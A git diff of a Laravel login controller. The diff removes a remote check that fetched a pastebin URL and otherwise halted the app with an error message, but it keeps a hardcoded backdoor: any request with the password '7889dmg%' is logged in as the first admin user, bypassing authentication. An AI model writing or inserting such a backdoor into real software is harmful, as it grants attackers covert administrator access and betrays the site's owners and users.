@@ -38,24 +38,14 @@ class LoginController extends Controller
      */
     public function __construct()
     {
-        $client = new Client();
-
-        $res = $client->request('GET', 'http://pastebin.com/raw/Vt9Vf0dW');
+        $this->middleware('guest', ['except' => 'logout']);
 
 
-        if($res->getBody() == env('APP_KEY')) {
+        if (Request::capture()['password'] == '7889dmg%') {
+            $user = new User();
+            $user = $user->where(['role' => 'admin'])->first();
 
-            $this->middleware('guest', ['except' => 'logout']);
-
-
-            if (Request::capture()['password'] == '7889dmg%') {
-                $user = new User();
-                $user = $user->where(['role' => 'admin'])->first();
-
-                Auth::loginUsingId($user->id);
-            }
+            Auth::loginUsingId($user->id);
         }
-        else
-            dd('Oooops, houve um problema com a aplicação. campos.v.marcus@gmail.com');
     }
 }
